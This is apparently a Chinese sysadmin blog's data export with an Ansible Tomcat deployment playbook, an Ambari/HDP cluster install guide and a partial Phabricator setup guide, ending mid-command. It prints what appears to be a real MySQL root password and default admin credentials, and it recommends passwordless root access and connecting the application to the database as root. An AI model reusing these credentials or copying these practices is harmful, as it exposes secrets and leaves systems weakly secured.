zh_CN.UTF-8 vars:#jenkins-打包目录 TESTWAR: /root/java_war/haozhuo-family.war#生产环境中项目的tomcat所在的位置 OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT#生产环境中老版本项目所在webapps备份目录的位置 backupwebapps: /srv/tomcat/tomcat_family/warbackup#从jenkins-打包环境获取的新版本war包所在的位置 NEWWAR: /root/java_war/#生产环境中项目war包的名字 WARNAME: haozhuo-family.war#kill服务type路径 DOWNFILE: /srv/tomcat/tomcat_family tasks: - name: copy-war-file copy: src=&#123;&#123; TESTWAR &#125;&#125; dest=&#123;&#123; NEWWAR &#125;&#125; - name: mkdir-bakwar-file file: path=&#123;&#123; backupwebapps &#125;&#125; state=directory owner=tomcat group=tomcat mode=755 - name: bakwar-file shell: \"cp -r &#123;&#123; OLDHOME &#125;&#125; &#123;&#123; backupwebapps &#125;&#125;\" - name: unzip war. unarchive: src=&#123;&#123; NEWWAR &#125;&#125;/&#123;&#123; WARNAME &#125;&#125; dest=&#123;&#123; OLDHOME &#125;&#125; - name: stop-tomcat-service shell: \"ps -ef |grep &#123;&#123; DOWNFILE &#125;&#125; |grep -v grep |awk '&#123;print $2&#125;' |xargs kill -9\" ignore_errors: yes async: 0 - name: start-tomcat-service-nohup shell: chdir=&#123;&#123; DOWNFILE &#125;&#125;/bin nohup ./startup.sh &amp;","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"},{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"HORTONW0RKS数据平台实现搭建Ambari配置和部署HDP集群监控Hadoop集群","slug":"大数据hadoop/HORTONW0RKS数据平台实现搭建Ambari配置和部署HDP集群监控Hadoop集群 ","date":"2017-02-08T09:56:03.000Z","updated":"2017-03-28T09:42:31.000Z","comments":true,"path":"2017/02/08/大数据hadoop/HORTONW0RKS数据平台实现搭建Ambari配置和部署HDP集群监控Hadoop集群 /","link":"","permalink":"http://blog.yangcvo.me/2017/02/08/大数据hadoop/HORTONW0RKS数据平台实现搭建Ambari配置和部署HDP集群监控Hadoop集群 /","excerpt":"","text":"HORTONW0RKS数据平台搭建Ambari管理监控Hadoop集群 题外话 我现在在一家上市公司旗下控股子公司负责运维部门，负责IT网络安全办公：主要做的应用运维和网络运维，兼大数据运维。最近跟新来的架构师聊了下Hadoop监控方面：HORTONW0RKS数据平台搭建Ambari监控Hadoop集群. HORTONW0RKS数据平台（HDP ®）HDP是业内唯一真正安全的企业级开源的Apache的Hadoop™ ®分配基于集中式架构。HDP解决了静态数据的完整需求，为实时客户应用提供支持，并提供可加速决策和创新的可靠分析。 使用Hortonworks Sandbox试用最新的HDP功能，或者为生产环境设置HDP，安装和配置群集。查看官网文档：HORTONWORKS CONNECTED DATA PLATFORMS DOWNLOADS 1. 将Ambari服务存储库文件下载到安装主机上的目录。 Centos6.5 1wget -nv http://public-repo-1.hortonworks.com/ambari/centos6/2.x/updates/2.4.2.0/ambari.repo -O /etc/yum.repos.d/ambari.repo ⚠️警告：不要修改ambari.repo文件名。在代理注册期间，此文件应在Ambari服务器主机上可用。 通过检查repo列表确认存储库已配置。 1yum repolist 您应该在列表中看到类似于以下Ambari存储库的值。 版本值因安装而异。 安装Ambari服务。这也安装了默认的PostgreSQL Ambari数据库。 1yum install ambari-server 输入y提示，以确认交易和依赖性检查时。 成功安装将显示类似于以下内容的输出： 12345678910111213141516安装：postgresql-libs-8.4.20-3.el6_6.x86_64 1/4安装：postgresql-8.4.20-3.el6_6.x86_64 2/4安装：postgresql-server-8.4.20-3.el6_6.x86_64 3/4安装：ambari-server-2.4.2.0-1470.x86_64 4/4验证：ambari-server-2.4.2.0-1470.x86_64 1/4验证：postgresql-8.4.20-3.el6_6.x86_64 2/4验证：postgresql-server-8.4.20-3.el6_6.x86_64 3/4验证：postgresql-libs-8.4.20-3.el6_6.x86_64 4/4安装： ambari-server.x86_64 0：2.4.2.0-1470 安装这里的时候会有点慢，因为是访问国外网站下载资源。已安装依赖关系： postgresql.x86_64 0：8.4.20-3.el6_6 postgresql-libs.x86_64 0：8.4.20-3.el6_6 postgresql-server.x86_64 0：8.4.20-3.el6_6 ❗️❗️【注意】 接受有关信任Hortonworks GPG密钥的警告。该键将自动下载并用于验证Hortonworks的软​​件包。您将看到以下消息： Importing GPG key 0x07513CAD: Userid: “Jenkins (HDP Builds) &#x6a;&#x65;&#110;&#x6b;&#x69;&#110;&#64;&#104;&#111;&#114;&#116;&#111;&#110;&#119;&#111;&#114;&#107;&#x73;&#46;&#99;&#111;&#x6d;“ From :http://s3.amazonaws.com/dev.hortonworks.com/ambari/centos6/RPM-GPG-KEY/RPM-GPG-KEY-Jenkins ❗️❗️【注意】 在具有有限Internet访问或没有Internet访问的群集上部署HDP时，应使用其他方法提供对位的访问。有关设置本地存储库的详细信息，请参阅使用本地存储库。 Ambari服务器默认使用嵌入式PostgreSQL数据库。当您安装Ambari服务器时，PostgreSQL软件包和依赖关系必须可用于安装。这些包通常作为操作系统存储库的一部分提供。请确认您具有适用于postgresql-server软件包的相应存储库。 2.设置Ambari服务器在启动Ambari服务器之前，必须设置Ambari服务器。安装程序将Ambari配置为与Ambari数据库通信，安装JDK并允许您自定义Ambari Server守护程序将作为运行的用户帐户。该 ambari-server setup命令管理设置过程。在Ambari服务器主机上运行以下命令以开始设置过程。您还可以将“ 设置选项”附加到命令。 启动服务 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162ambari-server setup###这里由于下载jdk1.8太慢速度过慢。我提前把jdk下载下来放到了/srv/jdk1.8.0_66 目录[root@ambari-server_01 ~]# ambari-server setupUsing python /usr/bin/pythonSetup ambari-serverChecking SELinux...SELinux status is 'enabled'SELinux mode is 'permissive'WARNING: SELinux is set to 'permissive' mode and temporarily disabled.OK to continue [y/n] (y)? yCustomize user account for ambari-server daemon [y/n] (n)? yEnter user account for ambari-server daemon (root):Adjusting ambari-server permissions and ownership...Checking firewall status...Checking JDK...[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8[2] Oracle JDK 1.7 + Java Cryptography Extension (JCE) Policy Files 7[3] Custom JDK==============================================================================Enter choice (1): 3WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.WARNING: JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.Path to JAVA_HOME: /srv/jdk1.8.0_66Validating JDK on Ambari Server...done.Completing setup...Configuring database...Enter advanced database configuration [y/n] (n)? yConfiguring database...==============================================================================Choose one of the following options:[1] - PostgreSQL (Embedded)[2] - Oracle[3] - MySQL / MariaDB[4] - PostgreSQL[5] - Microsoft SQL Server (Tech Preview)[6] - SQL Anywhere[7] - BDB==============================================================================Enter choice (1):3Database name (ambari):Postgres schema (ambari):Username (ambari):Enter Database Password (bigdata):Default properties detected. Using built-in database.Configuring ambari database...Checking PostgreSQL...Running initdb: This may take up to a minute.正在初始化数据库：[确定]About to start PostgreSQLConfiguring local database...Connecting to local database...done.Configuring PostgreSQL...Restarting PostgreSQLExtracting system views...ambari-admin-2.4.2.0.136.jar............Adjusting ambari-server permissions and ownership...Ambari Server 'setup' completed successfully.You have mail in /var/spool/mail/root 2.1 响应安装提示：如果您没有暂时禁用SELinux，您可能会收到警告。接受默认值（y），然后继续。 默认情况下，Ambari服务器运行在root。在Customize user account for ambari-server daemon提示符处接受默认（n），以继续root。 如果要创建其他用户以运行Ambari服务器或分配以前创建的用户，请y在 Customize user account for ambari-server daemon提示符处选择，然后提供用户名。有关以非root用户身份运行Ambari服务器的更多信息，请参阅Hortonworks数据平台Apache Ambari参考&gt; 为非根用户配置Ambari 如果您没有暂时停用iptables，可能会收到警告。输入y以继续。 JDK选择要下载的JDK版本。输入1以下载Oracle JDK 1.8。或者，您可以选择输入自定义JDK。如果选择“自定义JDK”，则必须在所有主机上手动安装JDK并指定Java Home路径。 ❗️❗️【注意】 JDK支持完全取决于您选择的HDP Stack版本。请参阅Hortonworks数据平台Apache Ambari参考以查看要安装的HDP Stack版本支持的JDK版本。默认情况下，Ambari服务器设置下载并安装Oracle JDK 1.8和随附的Java密码术扩展（JCE）策略文件。如果计划使用其他版本的JDK，请参阅 设置选项以获取更多信息。 出现提示时接受Oracle JDK许可证。您必须接受此许可证才能从Oracle下载必需的JDK。JDK在部署阶段安装。 数据库选择： 选择n为，Enter advanced database configuration以便为Ambari使用默认的嵌入式PostgreSQL数据库。默认的PostgreSQL数据库名是ambari。默认用户名和密码为ambari/bigdata。否则，要使用现有的PostgreSQL，MySQL / MariaDB或Oracle数据库与Ambari，请选择y。 如果使用现有的PostgreSQL，MySQL / MariaDB或Oracle数据库实例，请使用以下提示之一： ❗️❗️[重要]在运行安装程序和输入高级数据库配置之前，必须使用“使用非默认数据库- Ambari”中详述的步骤准备非默认数据库实例。 ❗️❗️[重要] 不支持使用Microsoft SQL Server或SQL Anywhere数据库选项。 要使用现有的Oracle实例，并为该数据库选择自己的数据库名称，用户名和密码，请输入2。选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，服务名或SID，用户名和密码。要使用现有的MySQL / MariaDB数据库，并为该数据库选择自己的数据库名称，用户名和密码，请输入3。选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，数据库名称，用户名和密码。要使用现有的PostgreSQL数据库，并为该数据库选择自己的数据库名称，用户名和密码，请输入4。选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，数据库名称，用户名和密码。继续配置远程数据库连接属性[y / n]选择y。 这里数据库用户名和密码都是默认安装： 1234Database name (ambari)Postgres schema (ambari)Username (ambari)Enter Database Password (bigdata) 这里我做了一层Nginx代理：将Ambari服务器配置为使用此代理服务器 3.启动Ambari服务器在Ambari服务器主机上运行以下命令： ambari-server start 1234567891011121314[root@ambari-server ~]# ambari-server startUsing python /usr/bin/pythonStarting ambari-serverAmbari Server running with administrator privileges.Organizing resource files at /var/lib/ambari-server/resources...Ambari database consistency check started...No errors were found.Ambari database consistency check finishedServer PID at: /var/run/ambari-server/ambari-server.pidServer out at: /var/log/ambari-server/ambari-server.outServer log at: /var/log/ambari-server/ambari-server.logWaiting for server start....................Ambari Server 'start' completed successfully.You have mail in /var/spool/mail/root 要检查Ambari服务器进程： ambari-server status 停止Ambari服务器： ambari-server stop 在Ambari服务器启动时，Ambari运行数据库一致性检查，查找问题。如果发现任何问题，Ambari服务器启动将中止，并且一条消息将打印到控制台“数据库配置一致性检查失败”。更多详细信息将写入以下日志文​​件： /var/log/ambari-server/ambari-server-check-database.log 您可以通过使用以下选项跳过此检查来强制Ambari服务器启动： ambari-server start --skip-database-check 如果存在数据库问题，请选择跳过此检查，在更正数据库一致性问题之前，不要对集群拓扑进行任何更改或执行集群升级。最好查看官网操作。 第3章安装，配置和部署HDP集群1.登录到Apache Ambari 将浏览器指向 http://&lt;your.ambari.server&gt; :8080，其中&lt;your.ambari.server&gt;是您的ambari服务器主机的名称。例如，默认Ambari服务器主机位于http://c6401.ambari.apache.org:8080。 使用默认用户名/密码登录Ambari服务器：admin / admin。您可以稍后更改这些凭据。 2.启动Ambari安装向导从Ambari Welcome页面，选择启动安装向导。 提供集群，管理谁可以访问群集，以及自定义视图为Ambari用户。 3.命名您的群集在Name your cluster，键入要创建的集群的名称。名称中不要使用空格或特殊字符。 选择Next。 4.选择版本 这里我选择redhat6 其他的都remove掉。 在此步骤中，您将选择群集的软件版本和交付方式。使用公共存储库需要Internet连接。使用本地存储库需要您在网络中可用的存储库中配置软件。 选择堆栈 可用的HDP版本显示在TAB中。当您选择TAB时，Ambari会尝试发现该HDP堆栈的特定版本可用。该列表显示在DROPDOWN中。对于该特定版本，将显示可用的服务，其中的版本显示在TABLE中。 选择版本 如果Ambari可以访问Internet，则特定版本将作为选项列在DROPDOWN中。如果您有未列出的版本的版本定义文件，您可以单击添加版本…并上载VDF文件。此外，如果您无法访问Internet或不确定要安装哪个特定版本，则 默认版本定义也包含在列表中。 选择存储库 Ambari允许您选择从公共存储库（如果您有Internet访问权限）或本地存储库安装软件。无论您的选择如何，您都可以编辑存储库的基本URL。将显示可用的操作系统，您可以从列表中添加/删除操作系统以适合您的环境 ❗️❗️注意UI显示基于操作系统系列（OS系列）的存储库基本URL。请确保基于正在运行的操作系统设置正确的操作系统系列。下表将OS系列映射到操作系统。 高级选项 有高级存储库选项可用。 跳过存储库基本URL验证（高级）： 当您单击下一步时，Ambari将尝试连接到存储库基本URL，并验证您已输入验证存储库。如果没有，将显示一个错误，您必须在继续之前纠正。 使用RedHat Satellite/Spacewalk：仅当计划使用本地存储库时，才会启用此选项。当您为软件存储库选择此选项时，您负责配置Satellite/Spacewalk中的存储库通道，并确认所选群集版本的存储库在群集中的主机上可用。 5.安装选项为了构建集群，安装向导将提示您有关如何设置它的一般信息。您需要提供每个主机的FQDN。该向导还需要访问在设置无密码SSH中创建的私钥文件 。使用主机名和密钥文件信息，向导可以定位，访问和与群集中的所有主机安全交互。 使用Target Hosts文本框输入主机名列表，每行一个。您可以使用括号内的范围来表示较大的主机集。例如，对于host01.domain通过host10.domain使用 host[01-10].domain ⚠️ 安装服务器集群机器一定要系统版本要一致不然安装会提示版本不兼容。 ❗️❗️ 注意如果要在EC2上部署，请使用内部专用DNS主机名。 在ambari服务器配置hosts vim /etc/hosts 12192.168.1.151 datanode151192.168.1.173 datanode_173 datanode-173.hadoop 如果要让Ambari使用SSH在所有主机上自动安装Ambari代理，请选择Provide your SSH Private Key并使用部分中的 Choose File按钮Host Registration Information查找与先前在所有主机上安装的公钥相匹配的私钥文件，或者剪切并粘贴键手动插入文本框。 填写您选择的SSH密钥的用户名。如果不想使用root用户，则必须为可以在不输入密码的情况下执行sudo的帐户提供用户名。如果您的环境中的主机上的SSH配置为22以外的端口，您也可以更改它。 如果您不希望Ambari自动安装Ambari代理，请选择Perform manual registration。有关更多信息，请参阅手动安装Ambari代理。 选择Register and Confirm继续。 这里提示：The following hostnames are not valid FQDNs: datanode_173.hadoop 这里跳转到安装页面：发现报错提示datanode-173.hadoop主机访问Ambari机器不能访问。 6.确认主机Confirm Hosts 提示您确认Ambari已为您的集群找到正确的主机，并检查这些主机以确保它们具有继续安装所需的正确目录，软件包和进程。 如果选择了错误的主机，您可以通过选择相应的复选框并单击灰色Remove Selected按钮来删除它们。要删除单个主机，请单击Remove“操作”列中的小白色按钮。 在屏幕底部，您可能会注意到一个黄色框，表示在检查过程中遇到了一些警告。例如，您的主机可能已有wget或的副本 curl。选择Click here to see the warnings 查看检查内容和导致警告的原因的列表。警告页面还提供对python脚本的访问，可以帮助您清除可能遇到的任何问题，让您运行Rerun Checks。 在datanode_173服务器配置hosts vim /etc/hosts 12192.168.1.151 datanode151192.168.1.173 datanode_173 datanode-173.hadoop 每台节点里配置FQDN，如下以主节点为例 123vi /etc/sysconfig/networkNETWORKING=yesHOSTNAME=SY-001.hadoop 配置上就可以了。 把datanode151也是ambari机器配置在hosts就可以了。 最好设置root的无密码登录，因为我们配置的集群都是内网的，没什么安全性问题，使用root操作可以省去一些麻烦，非root用户可能在安装Hadoop组件时不能成功 下面是我安装这里提示没有找到文件目录查看安装报错操作： mkdir /var/lib/ambari-agent/data 7.选择服务将看到选择要安装到群集中的服务。HDP堆栈包括许多服务。您可以选择立即安装任何其他可用服务，或稍后添加服务。默认情况下，安装向导将选择所有可用的服务进行安装。 选择none清除所有选择，或选择 all选择所有列出的服务。 选择或清除单个复选框以定义一组要立即安装的服务。 选择要立即安装的服务后，选择Next。 8.分配主站Ambari安装向导会将所选服务的主组件分配给集群中的相应主机，并在Assign Masters中显示分配。左列显示服务和当前主机。右列显示主机的当前主组件分配，指示每个主机上安装的CPU内核数量和RAM数量。 要更改服务的主机分配，请从该服务的下拉菜单中选择主机名。 要删除ZooKeeper实例，请单击要删除的主机地址旁边的绿色减号图标。 当您对作业感到满意时，选择Next。 9.分配从属和客户端Ambari安装向导将从属组件（DataNodes，NodeManager和RegionServers）分配给集群中的相应主机。它还会尝试选择主机以安装适当的客户端集。 使用all或none可分别选择列中的所有主机或不选择任何主机。 如果主机旁边有星号，则该主机也运行一个或多个主组件。将鼠标悬停在星号上，以查看该主机上的哪些主组件。 通过使用特定主机旁边的复选框来微调您的选择。 当你对你的作业感到满意时，选择Next。 10.自定义服务自定义服务步骤为您提供一组选项卡，您可以查看和修改HDP集群设置。向导会尝试为每个选项设置合理的默认值。你是强烈建议，以检查这些设置为您的要求可能略有不同。 浏览每个服务标签，然后将光标悬停在每个属性上，您可以看到属性做什么的简要说明。显示的服务选项卡数取决于您决定在群集中安装的服务。任何需要输入的选项卡都会显示一个红色徽章，其中包含需要注意的属性数。选择显示红色徽章编号的每个服务选项卡，然后输入相应的信息。 目录 HDP将存储信息的目录的选择是至关重要的。Ambari将尝试根据您环境中可用的安装点选择合理的默认值，但强烈建议您查看Ambari推荐的默认目录设置。特别是，确认目录，例如/tmp和 /var被不被用于下HDFS的NameNode目录和数据管理部目录HDFS标签。 密码 您必须为Hive和Oozie服务以及Knox的主密钥提供数据库密码。使用Hive作为示例，选择Hive选项卡并展开高级部分。在以红色标记的数据库密码字段中，提供密码，然后重新键入以确认。 安装各个服务，并且完成安装后会启动相关服务，安装过程比较长，如中中出现错误，根据具体提供或日志进行操作。 这里我就不贴出来了，因为测试环境机器我做测试用机器配置不够所有后面结果经验写出来了。 安装的还是提示失败：ImportError: No module named rpm 参考这篇文章重新安装解决了这个问题：ImportError: No module named rpm 11.安装，启动和测试安装的进度将显示在屏幕上。Ambari安装，启动，并对每个组件运行一个简单的测试。过程的总体状态显示在屏幕顶部的进度栏中，主机的主机状态显示在主要部分。在此过程中不要刷新浏览器。刷新浏览器可能会中断进度指示器。 要查看每个主机已完成的任务的具体信息，请单击Message相应主机列中的链接。在 Tasks弹出窗口中，单击单个任务以查看相关的日志文件。您可以使用Show下拉列表选择过滤条件。要查看更大版本的日志内容，请单击Open图标或将内容复制到剪贴板，使用Copy图标。 安装完成效果图: 让我们从左侧栏或下拉菜单中选择Yarn进入YARN信息中心。 我们将开始更新线程容量调度策略的配置。 向下滚动到Scheduler页面的部分。默认容量调度策略只有一个队列。 让我们看看调度策略。向上滚动到页面顶部，然后点击快速链接。然后从下拉列表中选择ResourceManager UI。 正如你可以看到，我们只有默认策略。 参考安装Ambari官网地址install Ambari编译安装Ambari 2.4.2安装指南","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://blog.yangcvo.me/categories/大数据/"}],"tags":[{"name":"Big data Hadoop","slug":"Big-data-Hadoop","permalink":"http://blog.yangcvo.me/tags/Big-data-Hadoop/"}]},{"title":"Centos7搭建配置phabricator开源的可视化代码审查工具","slug":"自动化+可视化/Phabricator/Centos7搭建配置phabricator开源的可视化代码审查工具","date":"2017-01-07T05:47:27.000Z","updated":"2017-04-17T09:47:55.000Z","comments":true,"path":"2017/01/07/自动化+可视化/Phabricator/Centos7搭建配置phabricator开源的可视化代码审查工具/","link":"","permalink":"http://blog.yangcvo.me/2017/01/07/自动化+可视化/Phabricator/Centos7搭建配置phabricator开源的可视化代码审查工具/","excerpt":"","text":"Phabricator是由Fackbook开发的一个开源的可视化代码审查工具。公司项目管理和代码审查一直用jira和git来做,最近发现一个不错的开源的项目管理平台 自己搭建下感觉还挺好用的话就转移过来了。 简介在Phabricator中，可以非常方便的针对每一段代码进行交际讨论;负责审查的工程师可以接受代码改变，可以提出疑问要求原作者继续修改等等。 在Pharbricator中，可以新建代码仓库（也就是在phabricator中宿主仓库），也可以导入外部仓库（从外部仓库拉取数据，并跟踪该外部仓库保持数据同步，phabricator内部有一个更新机制）;支持http ，也支持ssh（不过配置比较麻烦点）; Phabricator支持两种代码审查工作流：“提交前审查”和“audit”（提交后审查）。 在Phabricator的主面板中主要有以下几个工具： 差分 - 审查代码：管理预推代码审查工作流程; Maniphest - 任务和错误：管理成员的所有任务和Bug，可对任务或Bug展开讨论; Diffusion - 主机和浏览存储库：管理代码仓库，支持Git / Hg / SVN; 审计 - 浏览和审计提交：管理后推代码审查工作流程; Phriction - Wiki：文档管理; 项目 - 组织：工程管理，可关联资源库; 源代码托管在Github 特性：代码审查（Code Review）git仓库跟踪bug项目管理团队沟通 关于phabricator更多的介绍，访问项目官网：phabricator 环境要求：Phabricator是一个LAMP应用套件，因此最基本的要求就是LAMP环境： 123456789* Linux系统环境：centos7.1 64位* Apache（或nginx，或lighttpd）：需要Apache 2.2.7以上版本。* MySQL：MySQL必需* PHP：需要PHP5.2以上版本这里我安装版本：* Apache 2.2.15* mysql 5.6.29* php 5.4.16 phabricator安装参考：官网phabricator安装 具体过程不描述，以我参考的网络资源进行说明。网上的资源参考了特别多，只放我认为最有帮助的。 首先，phabricator是基于php的，同时需要发送邮件（提醒代码审查者），所以假定服务器上已经配置好了php，mysql，nginx，postfix等环境;同时，官方推荐开启APC性能. ###1 安装MariaDB数据库 1yum install mariadb mariadb-server 启动Mariadb服务： 12systemctl start mariadbsystemctl enable mariadb 运行MySQL初始化安装脚本： 1mysql_secure_installation 默认密码为空。 这里需要配置优化my.cnf 如果默认不优化也是可以的不过安装完成以后可以看到我下面文章会出现10多个问题 大部分都是跟MySQL相关的。 配置优化MariaDB数据库：1234567vim /etc/my.cnf[mysqld]innodb_buffer_pool_size = 1600Mmax_allowed_packet = \"33554432\"sql_mode=STRICT_ALL_TABLESft_stopword_file=/var/www/html/phabricator/resources/sql/stopwords.txtft_min_word_len = 3 需要执行的SQL语句：12345678910111213141516[root@Phabricator sql]# mysql -uroot -pqwde1dsdfg3.comWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 75Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; REPAIR TABLE phabricator_search.search_documentfield;+-----------------------------------------+--------+----------+----------+| Table | Op | Msg_type | Msg_text |+-----------------------------------------+--------+----------+----------+| phabricator_search.search_documentfield | repair | status | OK |+-----------------------------------------+--------+----------+----------+1 row in set (0.00 sec) mysql 5.6安装，不过这里我最后启用的是5.6版本，原因已经说明了. 2 安装Apache1＃yum -y install httpd 配置Apache，提高一点安全性： 12sed -i 's/^/#&amp;/g' /etc/httpd/conf.d/welcome.conf # 注释掉每一行sed -i \"s/Options Indexes FollowSymLinks/Options FollowSymLinks/\" /etc/httpd/conf/httpd.conf 启动Apache web服务： 12systemctl start httpdsystemctl enable httpd 3 安装PHP和一些模块1yum install php php-mysqli php-mbstring php-gd php-curl php-cli php-common php-process 配置优化 不然安装成功以后会出现问题错误提现❌： 12345678910111. 未配置服务器时区 [root@Phabricator sql]# vim /etc/php.ini例 ;date.timezone = 改成: date.timezone = Asia/Shanghai PHP post_max_size未配置 将PHP 配置中的post_max_size 调整为至少32MB。设置为较小值时，大文件上传可能无法正常工作。post_max_size = 32M php5.4版本可以直接使用phabricator.sh提供的脚本安装，这个脚本会检查phabricator需要的环境，没有的会自动安装，之后会安装好phabricator，安装参考phabricator安装向导. 4 安装Git1yum install git 可参考网上防火墙和selinux建议根据此文章配置一下. 如果你已经设置好LAMP环境，你可以已经获得你所需的任何东东。如何安装LAMP可以查看我写yum一键安装与卸载LAMP环境 5 下载安装Phabricator既然你已经安装以上所需的依赖环境服务，下面获取Phabricator以及其依赖包： 123456mkdir /var/www/html/cd /var/www/html/git clone https://github.com/phacility/libphutil.gitgit clone https://github.com/phacility/arcanist.gitgit clone https://github.com/phacility/phabricator.gitchown -R apache: /var/www/html/* 6 创建Apache虚拟主机配置文件1vim /etc/httpd/conf.d/phabricator.conf 写入内容： 123456789101112131415&lt;VirtualHost *:80&gt; ServerAdmin phabricator.ihaozhuo.com DocumentRoot /var/www/html/phabricator/webroot/ ServerName phabricator.ihaozhuo.com ServerAlias phabricator.ihaozhuo.com RewriteEngine on RewriteRule ^/rsrc/(.*) - [L,QSA] RewriteRule ^/favicon.ico - [L,QSA] RewriteRule ^(.*)$ /index.php?__path__=$1 [B,L,QSA] &lt;Directory /var/www/html/phabricator/webroot/&gt; AllowOverride All &lt;/Directory&gt; ErrorLog /var/log/httpd/phabricator.ihaozhuo.com-error_log CustomLog /var/log/httpd/phabricator.ihaozhuo.com-access_log common&lt;/VirtualHost&gt; ❗️❗️注意替换上面的域名。其中/var/www/html/phabricator/webroot是我的phabricator安装路径，大家使用时候换成自己的即可。安装好phabricator之后，需要使用phabricator安装目录下bin文件夹下的命令来更新下. 重启apache服务：1systemctl restart httpd 7 设置MariaDB数据库配置Phabricator连接MariaDB需要的信息： 12345cd /var/www/html/phabricator/./bin/config set mysql.host localhost ./bin/config set mysql.port 3306./bin/config set mysql.user root./bin/config set mysql.pass &lt;your-MySQL-root-password&gt; 创建数据库：出现问题： 123456789101112131415161718[root@phabricator bin]# ./storage upgradeMySQL Credentials Not ConfiguredUnable to connect to MySQL using the configured credentials. You mustconfigure standard credentials before you can upgrade storage. Run thesecommands to set up credentials: phabricator/ $ ./bin/config set mysql.host __host__ phabricator/ $ ./bin/config set mysql.user __username__ phabricator/ $ ./bin/config set mysql.pass __password__These standard credentials are separate from any administrative credentialsprovided to this command with __--user__ or __--password__, and must beconfigured correctly before you can proceed.Raw MySQL Error: Attempt to connect to root@localhost failed with error#2002: Can't connect to local MySQL server through socket'/var/lib/mysql/mysql.sock' (2). 出现这一步问题 就是因为没有配置好MySQL的连接地址信息。配置下mysql的user和pass就行。 1234567[root@Phabricator local]# cat /var/www/html/phabricator/conf/local/local.json&#123; \"mysql.pass\": \"qwde1dsdfg3.com\", \"mysql.user\": \"root\", \"mysql.port\": \"3306\", \"mysql.host\": \"localhost\"&#125; 重新初始化数据库：12345678910111213141516171819202122232425[root@Phabricator phabricator]# ./bin/storage upgradeBefore running storage upgrades, you should take down the Phabricator webinterface and stop any running Phabricator daemons (you can disable thiswarning with --force). Are you ready to continue? [y/N] yLoading quickstart template onto \"localhost:3306\"...Applying patch \"phabricator:db.packages\" to host \"localhost:3306\"...Applying patch \"phabricator:20160201.revision.properties.1.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160201.revision.properties.2.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160706.phame.blog.parentdomain.2.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160706.phame.blog.parentsite.1.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160707.calendar.01.stub.sql\" to host \"localhost:3306\"...Applying patch \"phabricator:20160711.files.01.builtin.sql\" to host \"localhost:3306\".............Missing Keyphabricator_search search_documentfield corpus Surplus Keyphabricator_search search_documentfield key_corpus Missing Keyphabricator_worker worker_archivetask key_modified Missing KeyApplying schema adjustments...Done.Completed applying all schema adjustments. 8 查看数据库：123456789101112131415161718192021222324252627282930313233343536373839404142[root@Phabricator phabricator]# mysql -uroot -pqwde1dsdfg3.comWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 177Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------------+| Database |+--------------------------+| information_schema || mysql || performance_schema || phabricator_almanac || phabricator_audit || phabricator_auth || phabricator_badges || phabricator_cache || phabricator_calendar || phabricator_chatlog || phabricator_conduit || phabricator_config || phabricator_conpherence || phabricator_countdown || phabricator_daemon || phabricator_dashboard || phabricator_differential || phabricator_diviner || phabricator_doorkeeper || phabricator_draft || phabricator_drydock || phabricator_fact || phabricator_feed || phabricator_file || phabricator_flag || phabricator_fund || ....... |+--------------------------+61 rows in set (0.01 sec) ❗️❗️注：upgrade之后，show databases你会发现建立了许多phabrictor开头的数据库。 ###8.1 配置URL： 未配置此安装的基本URI，并且在配置之前，主要功能将无法正常工作。您应该将基本URI设置为您将用于访问Phabricator的URI，如“http://phabricator.example.com/”。如果使用的端口不是80（http）或443（https），请包括协议（http或https），域名和端口号。基于此请求，正确的设置似乎是：http : //phabricator.ihaozhuo.com/要配置基本URI，请运行以下命令。 12[root@Phabricator phabricator]# ./bin/config set phabricator.base-uri 'http://phabricator.ihaozhuo.com/'Set 'phabricator.base-uri' in local configuration. 9 设置防火墙12firewall-cmd --zone=public --permanent --add-service=httpfirewall-cmd --reload 9.1 Phabricator Daemons Are Not Running启动守护进程1phabricator/ $ ./bin/phd start 10 完成安装配置phabricator： 123cd /var/www/html/phabricator/./bin/config set phabricator.base-uri 'http://your_domain_or_IP'./bin/phd start 使用浏览器访问：http://your_domain_or_IP 然后根据提示修复一些问题。 登录进来管理界面： 创建项目例子： Projects ——》 Create Project ——》填写好项目名称 ——》Create New Project 创建完成效果： 安装完成以后出现10多个问题解决：汉化翻译过来： ❓说明：按问题提示操作解决故障。一般都有问题修复解决方法的，官方这点还是很不错的。 棘手问题1 如果遇到这个问题：Alternate File Domain Not Configured 操作了这条命令失效 最好别操作： 123phabricator/ $ ./bin/config set security.alternate-file-domain &lt;domain&gt;[root@Phabricator phabricator]# ./bin/config set security.alternate-file-domain http://cdn.phabricator.com 如果是CDN数据存放可以使用这个命令。不然会出现访问失败。我是参考这篇文档解决问题：Phabricator not rendering resources over https删除security.alternate-file-domain可以访问。 棘手问题2 PHP Extension ‘APC’ Not Installed 参考文章：PHP Extension ‘APC’ Not Installed 123456# yum install php-pear# pecl install apc# echo \"extension=apc.so\" &gt;&gt; /etc/php.ini# echo \"apc.enabled=1\" &gt;&gt; /etc/php.ini# cp 